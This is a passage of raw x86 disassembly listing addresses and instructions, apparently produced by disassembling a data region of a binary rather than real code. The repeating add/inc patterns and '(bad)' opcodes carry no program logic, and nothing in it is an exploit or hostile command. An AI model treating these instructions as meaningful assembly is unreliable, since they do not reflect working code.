  44d11a:	inc    DWORD PTR [eax]
  44d11c:	add    BYTE PTR [esi],bh
  44d11e:	inc    DWORD PTR [eax]
  44d120:	add    BYTE PTR [edi+edi*8+0x0],al
  44d124:	add    BYTE PTR [ebx-0x1],al
  44d127:	add    BYTE PTR [eax],al
  44d129:	cmp    edi,edi
  44d12b:	add    BYTE PTR [eax],al
  44d12d:	cmp    bh,bh
  44d12f:	add    BYTE PTR [eax],al
  44d131:	cmp    edi,edi
  44d133:	add    BYTE PTR [eax],al
  44d135:	cmp    al,0xff
  44d137:	add    BYTE PTR [eax],al
  44d139:	inc    DWORD PTR ss:[eax]
  44d13c:	add    BYTE PTR [edi+edi*8],dh
  44d13f:	add    BYTE PTR [eax],al
  44d141:	xor    al,0xff
  44d143:	add    BYTE PTR [eax],al
  44d145:	xor    bh,bh
  44d147:	add    BYTE PTR [eax],al
  44d149:	xor    edi,edi
  44d14b:	add    BYTE PTR [eax],al
  44d14d:	xor    edi,edi
  44d14f:	add    BYTE PTR [eax],al
  44d151:	xor    bh,bh
  44d153:	add    BYTE PTR [eax],al
  44d155:	sub    bh,bh
  44d157:	add    BYTE PTR [eax],al
  44d159:	sbb    eax,0x200000ff
  44d15e:	inc    DWORD PTR [eax]
  44d160:	add    BYTE PTR [ebx],ah
  44d162:	inc    DWORD PTR [eax]
  44d164:	add    BYTE PTR [eax],ch
  44d166:	inc    DWORD PTR [eax]
  44d168:	add    BYTE PTR [edi],ah
  44d16a:	inc    DWORD PTR [eax]
  44d16c:	add    BYTE PTR [edi+edi*8],ah
  44d16f:	add    BYTE PTR [eax],al
  44d171:	inc    DWORD PTR es:[eax]
  44d174:	add    BYTE PTR [edi],ch
  44d176:	inc    DWORD PTR [eax]
  44d178:	add    BYTE PTR [eax],dh
  44d17a:	inc    DWORD PTR [eax]
  44d17c:	add    BYTE PTR [ecx],dh
  44d17e:	inc    DWORD PTR [eax]
  44d180:	add    BYTE PTR [eax],dh
  44d182:	inc    DWORD PTR [eax]
  44d184:	add    BYTE PTR [edi],ch
  44d186:	inc    DWORD PTR [eax]
  44d188:	add    BYTE PTR [edi+edi*8],dh
  44d18b:	add    BYTE PTR [eax],al
  44d18d:	cmp    edi,edi
  44d18f:	add    BYTE PTR [eax],al
  44d191:	cmp    eax,0x340000ff
  44d196:	inc    DWORD PTR [eax]
  44d198:	add    BYTE PTR [ecx],bh
  44d19a:	inc    DWORD PTR [eax]
  44d19c:	add    BYTE PTR [esi],bh
  44d19e:	inc    DWORD PTR [eax]
  44d1a0:	add    BYTE PTR [edx],bh
  44d1a2:	inc    DWORD PTR [eax]
  44d1a4:	add    BYTE PTR [eax],bh
  44d1a6:	inc    DWORD PTR [eax]
  44d1a8:	add    BYTE PTR [ebx-0x1],al
  44d1ab:	add    BYTE PTR [eax],al
  44d1ad:	inc    edx
  44d1ae:	inc    DWORD PTR [eax]
  44d1b0:	add    BYTE PTR [edi-0x1],al
  44d1b3:	add    BYTE PTR [eax],al
  44d1b5:	dec    esp
  44d1b6:	inc    DWORD PTR [eax]
  44d1b8:	add    BYTE PTR [edi+edi*8+0x0],cl
  44d1bc:	add    BYTE PTR [edi+edi*8+0x0],dl
  44d1c0:	add    BYTE PTR [edx-0x1],dl
  44d1c3:	add    BYTE PTR [eax],al
  44d1c5:	push   eax
  44d1c6:	inc    DWORD PTR [eax]
  44d1c8:	add    BYTE PTR [edi+edi*8+0x0],cl
  44d1cc:	add    BYTE PTR [edi-0x1],al
  44d1cf:	add    BYTE PTR [eax],al
  44d1d1:	inc    ebx
  44d1d2:	inc    DWORD PTR [eax]
  44d1d4:	add    BYTE PTR [edi+edi*8+0x0],al
  44d1d8:	add    BYTE PTR [edi+edi*8+0x0],al
  44d1dc:	add    BYTE PTR [edi+edi*8],bh
  44d1df:	add    BYTE PTR [eax],al
  44d1e1:	aas    
  44d1e2:	inc    DWORD PTR [eax]
  44d1e4:	add    BYTE PTR [esi],bh
  44d1e6:	inc    DWORD PTR [eax]
  44d1e8:	add    BYTE PTR ds:0x3c0000ff,bh
  44d1ee:	inc    DWORD PTR [eax]
  44d1f0:	add    BYTE PTR ds:0x360000ff,dh
  44d1f6:	inc    DWORD PTR [eax]
  44d1f8:	add    BYTE PTR [eax],dh
  44d1fa:	inc    DWORD PTR [eax]
  44d1fc:	add    BYTE PTR [eax],dh
  44d1fe:	inc    DWORD PTR [eax]
  44d200:	add    BYTE PTR [esi],ch
  44d202:	inc    DWORD PTR [eax]
  44d204:	add    BYTE PTR ds:0x320000ff,dh
  44d20a:	inc    DWORD PTR [eax]
  44d20c:	add    BYTE PTR ds:0x2e0000ff,ch
  44d212:	inc    DWORD PTR [eax]
  44d214:	add    BYTE PTR [edi],ah
  44d216:	inc    DWORD PTR [eax]
  44d218:	add    BYTE PTR [esi],bl
  44d21a:	inc    DWORD PTR [eax]
  44d21c:	add    BYTE PTR ds:0x280000ff,ah
  44d222:	inc    DWORD PTR [eax]
  44d224:	add    BYTE PTR [ebx],ch
  44d226:	inc    DWORD PTR [eax]
  44d228:	add    BYTE PTR [edi+edi*8],ch
  44d22b:	add    BYTE PTR [eax],al
  44d22d:	sub    edi,edi
  44d22f:	add    BYTE PTR [eax],al
  44d231:	das    
  44d232:	inc    DWORD PTR [eax]
  44d234:	add    BYTE PTR ds:0x300000ff,ch
  44d23a:	inc    DWORD PTR [eax]
  44d23c:	add    BYTE PTR ds:0x350000ff,dh
  44d242:	inc    DWORD PTR [eax]
  44d244:	add    BYTE PTR [edx],dh
  44d246:	inc    DWORD PTR [eax]
  44d248:	add    BYTE PTR [edi],ch
  44d24a:	inc    DWORD PTR [eax]
  44d24c:	add    BYTE PTR [edi+edi*8],ch
  44d24f:	add    BYTE PTR [eax],al
  44d251:	sub    al,0xff
  44d253:	add    BYTE PTR [eax],al
  44d255:	cmp    bh,bh
  44d257:	add    BYTE PTR [eax],al
  44d259:	cmp    al,0xff
  44d25b:	add    BYTE PTR [eax],al
  44d25d:	cmp    bh,bh
  44d25f:	add    BYTE PTR [eax],al
  44d261:	cmp    bh,bh
  44d263:	add    BYTE PTR [eax],al
  44d265:	cmp    eax,0x460000ff
  44d26a:	inc    DWORD PTR [eax]
  44d26c:	add    BYTE PTR [edi+edi*8+0x0],al
  44d270:	add    BYTE PTR [edx-0x1],cl
  44d273:	add    BYTE PTR [eax],al
  44d275:	dec    ebx
  44d276:	inc    DWORD PTR [eax]
  44d278:	add    BYTE PTR [edx-0x1],al
  44d27b:	add    BYTE PTR [eax],al
  44d27d:	dec    esi
  44d27e:	inc    DWORD PTR [eax]
  44d280:	add    BYTE PTR [ecx-0x1],cl
  44d283:	add    BYTE PTR [eax],al
  44d285:	dec    ebp
  44d286:	inc    DWORD PTR [eax]
  44d288:	add    BYTE PTR [ecx-0x1],cl
  44d28b:	add    BYTE PTR [eax],al
  44d28d:	inc    esi
  44d28e:	inc    DWORD PTR [eax]
  44d290:	add    BYTE PTR [edi-0x1],al
  44d293:	add    BYTE PTR [eax],al
  44d295:	inc    edx
  44d296:	inc    DWORD PTR [eax]
  44d298:	add    BYTE PTR ds:0x420000ff,bh
  44d29e:	inc    DWORD PTR [eax]
  44d2a0:	add    BYTE PTR [edi],bh
  44d2a2:	inc    DWORD PTR [eax]
  44d2a4:	add    BYTE PTR [ecx-0x1],al
  44d2a7:	add    BYTE PTR [eax],al
  44d2a9:	inc    eax
  44d2aa:	inc    DWORD PTR [eax]
  44d2ac:	add    BYTE PTR ds:0x360000ff,bh
  44d2b2:	inc    DWORD PTR [eax]
  44d2b4:	add    BYTE PTR [eax],dh
  44d2b6:	inc    DWORD PTR [eax]
  44d2b8:	add    BYTE PTR [eax],dh
  44d2ba:	inc    DWORD PTR [eax]
  44d2bc:	add    BYTE PTR ds:0x2f0000ff,dh
  44d2c2:	inc    DWORD PTR [eax]
  44d2c4:	add    BYTE PTR [ecx],dh
  44d2c6:	inc    DWORD PTR [eax]
  44d2c8:	add    BYTE PTR [eax],dh
  44d2ca:	inc    DWORD PTR [eax]
  44d2cc:	add    BYTE PTR [ebx],ch
  44d2ce:	inc    DWORD PTR [eax]
  44d2d0:	add    BYTE PTR [edi+edi*8],ch
  44d2d3:	add    BYTE PTR [eax],al
  44d2d5:	and    bh,bh
  44d2d7:	add    BYTE PTR [eax],al
  44d2d9:	push   ds
  44d2da:	inc    DWORD PTR [eax]
  44d2dc:	add    BYTE PTR [edx],ah
  44d2de:	inc    DWORD PTR [eax]
  44d2e0:	add    BYTE PTR [edx],ch
  44d2e2:	inc    DWORD PTR [eax]
  44d2e4:	add    BYTE PTR [eax],ch
  44d2e6:	inc    DWORD PTR [eax]
  44d2e8:	add    BYTE PTR [eax],ch
  44d2ea:	inc    DWORD PTR [eax]
  44d2ec:	add    BYTE PTR [ebx],ch
  44d2ee:	inc    DWORD PTR [eax]
  44d2f0:	add    BYTE PTR [ebx],dh
  44d2f2:	inc    DWORD PTR [eax]
  44d2f4:	add    BYTE PTR [esi],dh
  44d2f6:	inc    DWORD PTR [eax]
  44d2f8:	add    BYTE PTR [edi+edi*8],ch
  44d2fb:	add    BYTE PTR [eax],al
  44d2fd:	xor    bh,bh
  44d2ff:	add    BYTE PTR [eax],al
  44d301:	cmp    edi,edi
  44d303:	add    BYTE PTR [eax],al
  44d305:	xor    edi,edi
  44d307:	add    BYTE PTR [eax],al
  44d309:	xor    edi,edi
  44d30b:	add    BYTE PTR [eax],al
  44d30d:	das    
  44d30e:	inc    DWORD PTR [eax]
  44d310:	add    BYTE PTR ds:0x3d0000ff,dh
  44d316:	inc    DWORD PTR [eax]
  44d318:	add    BYTE PTR [edi],bh
  44d31a:	inc    DWORD PTR [eax]
  44d31c:	add    BYTE PTR [edi],dh
  44d31e:	inc    DWORD PTR [eax]
  44d320:	add    BYTE PTR [edi+edi*8],bh
  44d323:	add    BYTE PTR [eax],al
  44d325:	inc    edi
  44d326:	inc    DWORD PTR [eax]
  44d328:	add    BYTE PTR [ebx-0x1],al
  44d32b:	add    BYTE PTR [eax],al
  44d32d:	inc    esi
  44d32e:	inc    DWORD PTR [eax]
  44d330:	add    BYTE PTR [edx-0x1],al
  44d333:	add    BYTE PTR [eax],al
  44d335:	aas    
  44d336:	inc    DWORD PTR [eax]
  44d338:	add    BYTE PTR [esi],bh
  44d33a:	inc    DWORD PTR [eax]
  44d33c:	add    BYTE PTR [edi+edi*8+0x0],al
  44d340:	add    BYTE PTR [ecx-0x1],al
  44d343:	add    BYTE PTR [eax],al
  44d345:	push   ecx
  44d346:	inc    DWORD PTR [eax]
  44d348:	add    BYTE PTR [ecx-0x1],cl
  44d34b:	add    BYTE PTR [eax],al
  44d34d:	inc    edi
  44d34e:	inc    DWORD PTR [eax]
  44d350:	add    BYTE PTR [edi+edi*8+0x0],al
  44d354:	add    BYTE PTR [ecx-0x1],al
  44d357:	add    BYTE PTR [eax],al
  44d359:	cmp    eax,0x440000ff
  44d35e:	inc    DWORD PTR [eax]
  44d360:	add    BYTE PTR [esi],bh
  44d362:	inc    DWORD PTR [eax]
  44d364:	add    BYTE PTR [eax-0x1],al
  44d367:	add    BYTE PTR [eax],al
  44d369:	cmp    edi,edi
  44d36b:	add    BYTE PTR [eax],al
  44d36d:	inc    DWORD PTR ss:[eax]
  44d370:	add    BYTE PTR [esi],dh
  44d372:	inc    DWORD PTR [eax]
  44d374:	add    BYTE PTR [eax],bh
  44d376:	inc    DWORD PTR [eax]
  44d378:	add    BYTE PTR [edi+edi*8],dh
  44d37b:	add    BYTE PTR [eax],al
  44d37d:	xor    edi,edi
  44d37f:	add    BYTE PTR [eax],al
  44d381:	xor    eax,0x320000ff
  44d386:	inc    DWORD PTR [eax]
  44d388:	add    BYTE PTR [edx],ch
  44d38a:	inc    DWORD PTR [eax]
  44d38c:	add    BYTE PTR [edi+edi*8],ch
  44d38f:	add    BYTE PTR [eax],al
  44d391:	inc    DWORD PTR cs:[eax]
  44d394:	add    BYTE PTR [ebx],ah
  44d396:	inc    DWORD PTR [eax]
  44d398:	add    BYTE PTR [esi],bl
  44d39a:	inc    DWORD PTR [eax]
  44d39c:	add    BYTE PTR [ecx],ah
  44d39e:	inc    DWORD PTR [eax]
  44d3a0:	add    BYTE PTR [edx],ah
  44d3a2:	inc    DWORD PTR [eax]
  44d3a4:	add    BYTE PTR [edi+edi*8],ah
  44d3a7:	add    BYTE PTR [eax],al
  44d3a9:	sub    bh,bh
  44d3ab:	add    BYTE PTR [eax],al
  44d3ad:	and    edi,edi
  44d3af:	add    BYTE PTR [eax],al
  44d3b1:	inc    DWORD PTR es:[eax]
  44d3b4:	add    BYTE PTR [esi],ch
  44d3b6:	inc    DWORD PTR [eax]
  44d3b8:	add    BYTE PTR [edi+edi*8],ch
  44d3bb:	add    BYTE PTR [eax],al
  44d3bd:	xor    eax,0x370000ff
  44d3c2:	inc    DWORD PTR [eax]
  44d3c4:	add    BYTE PTR [ebx],dh
  44d3c6:	inc    DWORD PTR [eax]
  44d3c8:	add    BYTE PTR ds:0x380000ff,dh
  44d3ce:	inc    DWORD PTR [eax]
  44d3d0:	add    BYTE PTR [edi+edi*8],bh
  44d3d3:	add    BYTE PTR [eax],al
  44d3d5:	cmp    eax,0x3d0000ff
  44d3da:	inc    DWORD PTR [eax]
  44d3dc:	add    BYTE PTR [ecx],bh
  44d3de:	inc    DWORD PTR [eax]
  44d3e0:	add    BYTE PTR [eax-0x1],al
  44d3e3:	add    BYTE PTR [eax],al
  44d3e5:	inc    esp
  44d3e6:	inc    DWORD PTR [eax]
  44d3e8:	add    BYTE PTR [eax-0x1],al
  44d3eb:	add    BYTE PTR [eax],al
  44d3ed:	inc    DWORD PTR ds:[eax]
  44d3f0:	add    BYTE PTR [ecx-0x1],al
  44d3f3:	add    BYTE PTR [eax],al
  44d3f5:	inc    ebx
  44d3f6:	inc    DWORD PTR [eax]
  44d3f8:	add    BYTE PTR [esi],bh
  44d3fa:	inc    DWORD PTR [eax]
  44d3fc:	add    BYTE PTR [edi+edi*8+0x0],al
  44d400:	add    BYTE PTR [edx-0x1],al
  44d403:	add    BYTE PTR [eax],al
  44d405:	inc    esp
  44d406:	inc    DWORD PTR [eax]
  44d408:	add    BYTE PTR [eax-0x1],al
  44d40b:	add    BYTE PTR [eax],al
  44d40d:	inc    edx
  44d40e:	inc    DWORD PTR [eax]
  44d410:	add    BYTE PTR [esi-0x1],al
  44d413:	add    BYTE PTR [eax],al
  44d415:	inc    esp
  44d416:	inc    DWORD PTR [eax]
  44d418:	add    BYTE PTR [eax-0x1],al
  44d41b:	add    BYTE PTR [eax],al
  44d41d:	cmp    bh,bh
  44d41f:	add    BYTE PTR [eax],al
  44d421:	cmp    bh,bh
  44d423:	add    BYTE PTR [eax],al
  44d425:	cmp    bh,bh
  44d427:	add    BYTE PTR [eax],al
  44d429:	cmp    bh,bh
  44d42b:	add    BYTE PTR [eax],al
  44d42d:	cmp    bh,bh
  44d42f:	add    BYTE PTR [eax],al
  44d431:	xor    eax,0x360000ff
  44d436:	inc    DWORD PTR [eax]
  44d438:	add    BYTE PTR [ebx],dh
  44d43a:	inc    DWORD PTR [eax]
  44d43c:	add    BYTE PTR [edi],ch
  44d43e:	inc    DWORD PTR [eax]
  44d440:	add    BYTE PTR [edi+edi*8],ch
  44d443:	add    BYTE PTR [eax],al
  44d445:	sub    eax,0x2b0000ff
  44d44a:	inc    DWORD PTR [eax]
  44d44c:	add    BYTE PTR [edx],ch
  44d44e:	inc    DWORD PTR [eax]
  44d450:	add    BYTE PTR [eax],ch
  44d452:	inc    DWORD PTR [eax]
  44d454:	add    BYTE PTR [esi],bl
  44d456:	inc    DWORD PTR [eax]
  44d458:	add    BYTE PTR [eax],ah
  44d45a:	inc    DWORD PTR [eax]
  44d45c:	add    BYTE PTR ds:0x240000ff,ah
  44d462:	inc    DWORD PTR [eax]
  44d464:	add    BYTE PTR [edi+edi*8],ah
  44d467:	add    BYTE PTR [eax],al
  44d469:	sub    edi,edi
  44d46b:	add    BYTE PTR [eax],al
  44d46d:	sub    edi,edi
  44d46f:	add    BYTE PTR [eax],al
  44d471:	sub    bh,bh
  44d473:	add    BYTE PTR [eax],al
  44d475:	sub    al,0xff
  44d477:	add    BYTE PTR [eax],al
  44d479:	sub    eax,0x310000ff
  44d47e:	inc    DWORD PTR [eax]
  44d480:	add    BYTE PTR [edx],dh
  44d482:	inc    DWORD PTR [eax]
  44d484:	add    BYTE PTR ds:0x350000ff,dh
  44d48a:	inc    DWORD PTR [eax]
  44d48c:	add    BYTE PTR [edi],dh
  44d48e:	inc    DWORD PTR [eax]
  44d490:	add    BYTE PTR [esi],bh
  44d492:	inc    DWORD PTR [eax]
  44d494:	add    BYTE PTR ds:0x400000ff,bh
  44d49a:	inc    DWORD PTR [eax]
  44d49c:	add    BYTE PTR ds:0x3c0000ff,bh
  44d4a2:	inc    DWORD PTR [eax]
  44d4a4:	add    BYTE PTR [edi],bh
  44d4a6:	inc    DWORD PTR [eax]
  44d4a8:	add    BYTE PTR [edi],bh
  44d4aa:	inc    DWORD PTR [eax]
  44d4ac:	add    BYTE PTR [edi],dh
  44d4ae:	inc    DWORD PTR [eax]
  44d4b0:	add    BYTE PTR [edx],bh
  44d4b2:	inc    DWORD PTR [eax]
  44d4b4:	add    BYTE PTR [esi],bh
  44d4b6:	inc    DWORD PTR [eax]
  44d4b8:	add    BYTE PTR [ecx],bh
  44d4ba:	inc    DWORD PTR [eax]
  44d4bc:	add    BYTE PTR [eax-0x1],al
  44d4bf:	add    BYTE PTR [eax],al
  44d4c1:	cmp    eax,0x420000ff
  44d4c6:	inc    DWORD PTR [eax]
  44d4c8:	add    BYTE PTR [eax-0x1],al
  44d4cb:	add    BYTE PTR [eax],al
  44d4cd:	inc    DWORD PTR ds:[eax]
  44d4d0:	add    BYTE PTR [edx-0x1],al
  44d4d3:	add    BYTE PTR [eax],al
  44d4d5:	inc    ebx
  44d4d6:	inc    DWORD PTR [eax]
  44d4d8:	add    BYTE PTR [edi+edi*8+0x0],al
  44d4dc:	add    BYTE PTR [edx],bh
  44d4de:	inc    DWORD PTR [eax]
  44d4e0:	add    BYTE PTR [edi+edi*8],bh
  44d4e3:	add    BYTE PTR [eax],al
  44d4e5:	cmp    bh,bh
  44d4e7:	add    BYTE PTR [eax],al
  44d4e9:	aaa    
  44d4ea:	inc    DWORD PTR [eax]
  44d4ec:	add    BYTE PTR ds:0x330000ff,dh
  44d4f2:	inc    DWORD PTR [eax]
  44d4f4:	add    BYTE PTR ds:0x320000ff,dh
  44d4fa:	inc    DWORD PTR [eax]
  44d4fc:	add    BYTE PTR [ecx],dh
  44d4fe:	inc    DWORD PTR [eax]
  44d500:	add    BYTE PTR ds:0x2e0000ff,ch
  44d506:	inc    DWORD PTR [eax]
  44d508:	add    BYTE PTR [edi+edi*8],ch
  44d50b:	add    BYTE PTR [eax],al
  44d50d:	sub    bh,bh
  44d50f:	add    BYTE PTR [eax],al
  44d511:	inc    DWORD PTR es:[eax]
  44d514:	add    BYTE PTR [edi],bl
  44d516:	inc    DWORD PTR [eax]
  44d518:	add    BYTE PTR [eax],ah
  44d51a:	inc    DWORD PTR [eax]
  44d51c:	add    BYTE PTR [ebx],ah
  44d51e:	inc    DWORD PTR [eax]
  44d520:	add    BYTE PTR ds:0x250000ff,ah
  44d526:	inc    DWORD PTR [eax]
  44d528:	add    BYTE PTR [eax],ch
  44d52a:	inc    DWORD PTR [eax]
  44d52c:	add    BYTE PTR [ebx],ah
  44d52e:	inc    DWORD PTR [eax]
  44d530:	add    BYTE PTR [edx],ch
  44d532:	inc    DWORD PTR [eax]
  44d534:	add    BYTE PTR ds:0x280000ff,ch
  44d53a:	inc    DWORD PTR [eax]
  44d53c:	add    BYTE PTR [edi+edi*8],ch
  44d53f:	add    BYTE PTR [eax],al
  44d541:	xor    bh,bh
  44d543:	add    BYTE PTR [eax],al
  44d545:	xor    edi,edi
  44d547:	add    BYTE PTR [eax],al
  44d549:	aaa    
  44d54a:	inc    DWORD PTR [eax]
  44d54c:	add    BYTE PTR [edi],dh
  44d54e:	inc    DWORD PTR [eax]
  44d550:	add    BYTE PTR [edi+edi*8],bh
  44d553:	add    BYTE PTR [eax],al
  44d555:	cmp    edi,edi
  44d557:	add    BYTE PTR [eax],al
  44d559:	cmp    al,0xff
  44d55b:	add    BYTE PTR [eax],al
  44d55d:	inc    ecx
  44d55e:	inc    DWORD PTR [eax]
  44d560:	add    BYTE PTR [eax-0x1],al
  44d563:	add    BYTE PTR [eax],al
  44d565:	cmp    al,0xff
  44d567:	add    BYTE PTR [eax],al
  44d569:	inc    esp
  44d56a:	inc    DWORD PTR [eax]
  44d56c:	add    BYTE PTR ds:0x370000ff,bh
  44d572:	inc    DWORD PTR [eax]
  44d574:	add    BYTE PTR [ecx],bh
  44d576:	inc    DWORD PTR [eax]
  44d578:	add    BYTE PTR [edi+edi*8],bh
  44d57b:	add    BYTE PTR [eax],al
  44d57d:	inc    esp
  44d57e:	inc    DWORD PTR [eax]
  44d580:	add    BYTE PTR [edi],bh
  44d582:	inc    DWORD PTR [eax]
  44d584:	add    BYTE PTR [ebx-0x1],al
  44d587:	add    BYTE PTR [eax],al
  44d589:	inc    ebp
  44d58a:	inc    DWORD PTR [eax]
  44d58c:	add    BYTE PTR [edi+edi*8+0x0],al
  44d590:	add    BYTE PTR [ebx-0x1],al
  44d593:	add    BYTE PTR [eax],al
  44d595:	inc    DWORD PTR ds:[eax]
  44d598:	add    BYTE PTR [ecx],bh
  44d59a:	inc    DWORD PTR [eax]
  44d59c:	add    BYTE PTR [eax-0x1],al
  44d59f:	add    BYTE PTR [eax],al
  44d5a1:	cmp    al,0xff
  44d5a3:	add    BYTE PTR [eax],al
  44d5a5:	cmp    edi,edi
  44d5a7:	add    BYTE PTR [eax],al
  44d5a9:	aaa    
  44d5aa:	inc    DWORD PTR [eax]
  44d5ac:	add    BYTE PTR [edx],bh
  44d5ae:	inc    DWORD PTR [eax]
  44d5b0:	add    BYTE PTR [ebx],dh
  44d5b2:	inc    DWORD PTR [eax]
  44d5b4:	add    BYTE PTR [edi],ch
  44d5b6:	inc    DWORD PTR [eax]
  44d5b8:	add    BYTE PTR [edx],ch
  44d5ba:	inc    DWORD PTR [eax]
  44d5bc:	add    BYTE PTR [ebx],ch
  44d5be:	inc    DWORD PTR [eax]
  44d5c0:	add    BYTE PTR [edx],ch
  44d5c2:	inc    DWORD PTR [eax]
  44d5c4:	add    BYTE PTR [edi+edi*8],ch
  44d5c7:	add    BYTE PTR [eax],al
  44d5c9:	sub    bh,bh
  44d5cb:	add    BYTE PTR [eax],al
  44d5cd:	inc    DWORD PTR es:[eax]
  44d5d0:	add    BYTE PTR [esi],ah
  44d5d2:	inc    DWORD PTR [eax]
  44d5d4:	add    BYTE PTR [ecx],ah
  44d5d6:	inc    DWORD PTR [eax]
  44d5d8:	add    BYTE PTR [ebx],bl
  44d5da:	inc    DWORD PTR [eax]
  44d5dc:	add    BYTE PTR [edi],ah
  44d5de:	inc    DWORD PTR [eax]
  44d5e0:	add    BYTE PTR [edi],ah
  44d5e2:	inc    DWORD PTR [eax]
  44d5e4:	add    BYTE PTR [ebx],ah
  44d5e6:	inc    DWORD PTR [eax]
  44d5e8:	add    BYTE PTR [edx],ah
  44d5ea:	inc    DWORD PTR [eax]
  44d5ec:	add    BYTE PTR [esi],ah
  44d5ee:	inc    DWORD PTR [eax]
  44d5f0:	add    BYTE PTR [esi],ah
  44d5f2:	inc    DWORD PTR [eax]
  44d5f4:	add    DWORD PTR [edx],eax
  44d5f6:	inc    DWORD PTR [eax]
  44d5f8:	add    DWORD PTR [edx],eax
  44d5fa:	inc    DWORD PTR [eax]
  44d5fc:	add    DWORD PTR [edx],eax
  44d5fe:	inc    DWORD PTR [eax]
  44d600:	add    DWORD PTR [ebx],eax
  44d602:	inc    DWORD PTR [eax]
  44d604:	add    DWORD PTR [edx],eax
  44d606:	inc    DWORD PTR [eax]
  44d608:	add    DWORD PTR [edx],eax
  44d60a:	inc    DWORD PTR [eax]
  44d60c:	add    DWORD PTR [edx],eax
  44d60e:	inc    DWORD PTR [eax]
  44d610:	add    DWORD PTR [edx],eax
  44d612:	inc    DWORD PTR [eax]
  44d614:	add    DWORD PTR [edx],eax
  44d616:	inc    DWORD PTR [eax]
  44d618:	add    DWORD PTR [edx],eax
  44d61a:	inc    DWORD PTR [eax]
  44d61c:	add    DWORD PTR [edx],eax
  44d61e:	inc    DWORD PTR [eax]
  44d620:	add    DWORD PTR [edx],eax
  44d622:	inc    DWORD PTR [eax]
  44d624:	add    DWORD PTR [edx],eax
  44d626:	inc    DWORD PTR [eax]
  44d628:	add    DWORD PTR [edx],eax
  44d62a:	inc    DWORD PTR [eax]
  44d62c:	add    DWORD PTR [edx],eax
  44d62e:	inc    DWORD PTR [eax]
  44d630:	add    DWORD PTR [edx],eax
  44d632:	inc    DWORD PTR [eax]
  44d634:	add    BYTE PTR [eax],bh
  44d636:	inc    DWORD PTR [ecx]
  44d638:	add    DWORD PTR [ecx],ecx
  44d63a:	inc    DWORD PTR [eax]
  44d63c:	add    DWORD PTR [edx],eax
  44d63e:	inc    DWORD PTR [eax]
  44d640:	add    DWORD PTR [edx],eax
  44d642:	inc    DWORD PTR [eax]
  44d644:	add    DWORD PTR [ebx],eax
  44d646:	inc    DWORD PTR [eax]
  44d648:	add    DWORD PTR [ebx],eax
  44d64a:	inc    DWORD PTR [eax]
  44d64c:	add    DWORD PTR [edx],eax
  44d64e:	inc    DWORD PTR [eax]
  44d650:	add    DWORD PTR [edx],eax
  44d652:	inc    DWORD PTR [eax]
  44d654:	add    DWORD PTR [edx],eax
  44d656:	inc    DWORD PTR [eax]
  44d658:	add    DWORD PTR [edx],eax
  44d65a:	inc    DWORD PTR [eax]
  44d65c:	add    DWORD PTR [edx],eax
  44d65e:	inc    DWORD PTR [eax]
  44d660:	add    DWORD PTR [edx],eax
  44d662:	inc    DWORD PTR [eax]
  44d664:	add    DWORD PTR [ebx],eax
  44d666:	inc    DWORD PTR [eax]
  44d668:	add    DWORD PTR [ebx],eax
  44d66a:	inc    DWORD PTR [eax]
  44d66c:	add    DWORD PTR [ebx],eax
  44d66e:	inc    DWORD PTR [eax]
  44d670:	add    DWORD PTR [edx],eax
  44d672:	inc    DWORD PTR [eax]
  44d674:	add    DWORD PTR [edx],eax
  44d676:	inc    DWORD PTR [eax]
  44d678:	add    DWORD PTR [edx],eax
  44d67a:	inc    DWORD PTR [eax]
  44d67c:	add    BYTE PTR [eax],ch
  44d67e:	inc    DWORD PTR [eax]
  44d680:	add    BYTE PTR [edx],ch
  44d682:	inc    DWORD PTR [eax]
  44d684:	add    BYTE PTR [edx],ch
  44d686:	inc    DWORD PTR [eax]
  44d688:	add    BYTE PTR [edx],ch
  44d68a:	inc    DWORD PTR [eax]
  44d68c:	add    BYTE PTR [edx],ah
  44d68e:	inc    DWORD PTR [eax]
  44d690:	add    BYTE PTR [edx],ah
  44d692:	inc    DWORD PTR [eax]
  44d694:	add    BYTE PTR [edi+edi*8],bl
  44d697:	add    BYTE PTR [eax],al
  44d699:	sbb    al,0xff
  44d69b:	add    BYTE PTR [eax],al
  44d69d:	daa    
  44d69e:	inc    DWORD PTR [eax]
  44d6a0:	add    BYTE PTR [edi],ah
  44d6a2:	inc    DWORD PTR [eax]
  44d6a4:	add    BYTE PTR [edi],bl
  44d6a6:	inc    DWORD PTR [eax]
  44d6a8:	add    BYTE PTR [eax],ah
  44d6aa:	inc    DWORD PTR [eax]
  44d6ac:	add    BYTE PTR [ebx],ah
  44d6ae:	inc    DWORD PTR [eax]
  44d6b0:	add    BYTE PTR [edi+edi*8],ah
  44d6b3:	add    BYTE PTR [ecx],al
  44d6b5:	add    bh,bh
  44d6b7:	mov    eax,ds:0xb5fff5ff
  44d6bc:	push   esi
  44d6be:	inc    ecx
  44d6c0:	push   edi
  44d6c2:	push   DWORD PTR [ecx+0xefff6ff]
  44d6c8:	adc    bh,BYTE PTR [eax]
  44d6ca:	inc    DWORD PTR [ecx]
  44d6cc:	or     BYTE PTR [edi+edi*8-0x52],dl
  44d6d0:	push   ebp
  44d6d2:	push   DWORD PTR [ebp-0x4a000a01]
  44d6d8:	push   esi
  44d6da:	jmp    FWORD PTR [esi-0x52000901]
  44d6e0:	push   esi
  44d6e2:	push   DWORD PTR [edi+edi*8-0x50000a]
  44d6e9:	idiv   bh
  44d6eb:	mov    ch,0xff
  44d6ed:	idiv   edi
  44d6ef:	add    BYTE PTR [ecx],al
  44d6f1:	add    bh,bh
  44d6f3:	add    al,BYTE PTR [edx]
  44d6f5:	cmp    edi,edi
  44d6f7:	add    BYTE PTR [eax],al
  44d6f9:	add    bh,bh
  44d6fb:	add    BYTE PTR [ecx],al
  44d6fd:	add    bh,bh
  44d6ff:	leave  
  44d700:	push   edi
  44d702:	(bad)  
  44d703:	mov    edi,0xbffff7ff
  44d708:	push   esi
  44d70a:	(bad)  
  44d70b:	mov    ebx,0xbcfff5ff
  44d710:	push   esi
  44d712:	(bad)  
  44d713:	mov    ebp,0xc0fff7ff
  44d718:	push   edi
  44d71a:	jmp    FWORD PTR [esi]
  44d71c:	pusha  
  44d71d:	xchg   edi,eax
  44d71e:	push   DWORD PTR [ecx-0x4e000a01]
  44d724:	push   ebp
  44d726:	inc    esi
  44d728:	push   edi
  44d72a:	dec    edx
  44d72c:	push   edi
  44d72e:	(bad)  
  44d72f:	mov    ebp,0xaefff7ff
  44d734:	push   ebp
  44d736:	inc    DWORD PTR [eax]
  44d738:	add    DWORD PTR [edx],eax
  44d73a:	inc    DWORD PTR [eax]
  44d73c:	add    DWORD PTR [edx],eax
  44d73e:	inc    DWORD PTR [ecx]
